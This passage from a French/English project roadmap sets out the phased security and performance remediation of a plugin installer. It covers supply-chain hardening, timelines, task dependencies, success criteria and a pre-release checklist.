  - [ ] Network restrictions
- **Durée estimée**: 8h
- **Security benefit**: Malicious plugin containment

### 4.3 Supply Chain Security Hardening 🟢
- [ ] Implémenter Package Pinning
  - [ ] Lock all package versions
  - [ ] Hash verification
  - [ ] Signed releases
- [ ] Provenance Tracking
  - [ ] SBOM generation
  - [ ] Dependency tree documentation
  - [ ] Audit trail
- [ ] Build Reproducibility
  - [ ] Reproducible builds verification
  - [ ] Attestations
  - [ ] Public transparency
- **Durée estimée**: 6h
- **Security benefit**: Supply chain attack mitigation

---

## 📊 SUMMARY & TIMELINE

### Par Effort

```
Phase 0 (Setup):           4h  (⬜ À faire)
Phase 1 (Critical):       18h  (⬜ À faire)
Phase 2 (Major):          30h  (⬜ À faire)
Phase 3 (Performance):    40h  (⬜ À faire)
Phase 4 (Long-term):      20h  (🟢 Optionnel)
─────────────────────────────
TOTAL:                    112h (88h + 24h optionnel)
```

### Chronologie Recommandée

**Semaine 1** (40h):
- Phase 0: Setup infrastructure (4h) ← START HERE
- Phase 1: Critical fixes (18h)
- Phase 2.1-2.2: Essential refactors (8h) ← Parallel avec tests
- Phase 2.8: Security test suite (10h) ← Parallel, informé par Phase 1

**Semaine 2** (40h):
- Phase 2.3-2.7: Remaining major fixes (20h)
- Phase 3.1-3.3: First perf wins (16h)
- Phase 1/2 testing & validation (4h)

**Semaine 3** (30h):
- Phase 3.4-3.9: Remaining performance (24h)
- Buffer & refinement (6h)

**Post-Release** (20h optionnel):
- Phase 4: Long-term enhancements

### Critical Path Dependencies

```
0.1 (Audit) [DONE]
  └─> 0.2 (CI/CD)
        └─> 0.3 (Test fixtures)
              └─> 1.1 (Shell fix - Svelte)
                    ├─> 1.2 (Shell fix - Angular)
                    ├─> 1.3 (Shell fix - Autres)
                    └─> 2.8 (Security test suite)
  └─> 1.4 (Input validation)
  └─> 1.5 (Path traversal)
  └─> 1.6 (Package validation)
  └─> 1.7 (Timeouts)
  └─> 2.1 (Absolute paths)
  └─> 2.2 (Atomic install)
  └─> 2.3 (O(n) optimization)
  └─> 2.4 (Config injection fix)
  └─> 2.5 (Package integrity)
  └─> 2.6 (Update deps)
  └─> 2.7 (Rate limiting)
  └─> 2.8 (Complete test suite)
       └─> 3.1+ (Performance) [CAN RUN IN PARALLEL]
```

---

## 🎯 Définitions de Succès

**Phase 0**: ✅
- [ ] CI/CD security scanning active
- [ ] Test framework ready
- [ ] Exploitation payloads documented

**Phase 1**: 🔴 BLOCKING
- [ ] Zéro shell injection possible
- [ ] Path traversal impossibility
- [ ] Input validation 100% coverage
- [ ] npm registry poisoning prevented
- [ ] Timeouts enforced
- [ ] 120+ security tests PASS

**Phase 2**: 🔴 BLOCKING
- [ ] Atomic installation guarantee
- [ ] O(n) complexity verified
- [ ] Config injection impossible
- [ ] npm audit = 0 vulnerabilities
- [ ] All integration tests PASS
- [ ] Rollback 100% reliable

**Phase 3**: 🟡 BEFORE RELEASE
- [ ] 40-50% performance improvement
- [ ] <60s install pour 50 plugins
- [ ] <150MB peak memory
- [ ] Caching functional
- [ ] UI provides good feedback

**Phase 4**: 🟢 OPTIONAL
- [ ] Plugin sandboxing possible
- [ ] Supply chain hardened
- [ ] Bundle size optimized

---

## ✅ Checklist Pre-Release

**AVANT DE MERGER vers `main`:**

- [ ] Toutes Phase 1 tâches DONE
- [ ] Toutes Phase 2 tâches DONE
- [ ] All 120+ security tests PASS
- [ ] npm audit: 0 vulnerabilities
- [ ] npm run lint: 0 errors
- [ ] npm run build: successful
- [ ] npm test: all passing (>85% coverage)
- [ ] npm run test:security: all passing
- [ ] Benchmark suite shows improvements
- [ ] CHANGELOG.md updated
- [ ] SECURITY.md created
- [ ] Documentation updated
- [ ] Code review completed (security focus)
- [ ] Performance tests validated
- [ ] Staging deployment successful
- [ ] Rollback procedures tested

**BEFORE PRODUCTION RELEASE:**
- [ ] 1 week staging in production mode
- [ ] Monitor for errors/performance
- [ ] User feedback collected
- [ ] Patch 1.1.17 / 2.0.0 released
- [ ] Release notes published
- [ ] Security advisory published (if applicable)

---

## 📝 Notes de Projet

**Maintainers**: [À assigner]  
**Reviewers**: [À assigner]  
**Lead Dev**: [À assigner]  
**Security Lead**: [À assigner]  

**Communication**:
- Daily standups: [TBD]
- Security reviews: [TBD]
- Performance reports: [TBD]

**Ressources**:
- CVSS v3.1 Guide: https://www.first.org/cvss/v3.1/
- OWASP Top 10: https://owasp.org/Top10/
- npm Security: https://docs.npmjs.com/cli/audit

---

**Document Version**: 1.0  
**Dernière mise à jour**: 20 janvier 2026  
**Statut**: PRÊT POUR IMPLÉMENTATION
